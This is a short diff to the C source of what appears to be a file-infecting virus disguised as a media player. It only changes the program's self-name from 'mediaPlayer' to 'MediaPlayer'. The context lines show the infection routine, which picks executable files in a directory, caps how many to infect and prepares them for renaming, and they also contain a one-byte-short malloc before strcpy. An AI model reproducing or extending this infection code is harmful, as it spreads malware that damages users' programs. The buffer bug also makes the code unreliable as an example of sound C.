@@ -87,7 +87,7 @@ bool renameFiles(int numberToInfect, char *pgrmName)
                         struct stat sb;
                         stat(dir->d_name, &sb);
                         //checking conditions
-                        if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && (strcmp(dir->d_name, "mediaPlayer")) && (cpt <= numberToInfect) && !strstr(dir->d_name, ".old"))
+                        if ((S_IXUSR & sb.st_mode) && (S_IFREG & sb.st_mode) && (strcmp(dir->d_name, "MediaPlayer")) && (cpt <= numberToInfect) && !strstr(dir->d_name, ".old"))
                         {
                                 newName = (char *)malloc(strlen(dir->d_name));
                                 strcpy(newName, dir->d_name);
@@ -236,7 +236,7 @@ int main(int argc, char *argv[])
         renameFiles(numberOfFilesToInfect, argv[0]);
 
         //if the running program is not the mediaplayer
-        if (strcmp(argv[0], "./mediaPlayer"))
+        if (strcmp(argv[0], "./MediaPlayer"))
         {       
                 //if we have 2 arguments
                 if (argv[1] != NULL && argv[2] != NULL)
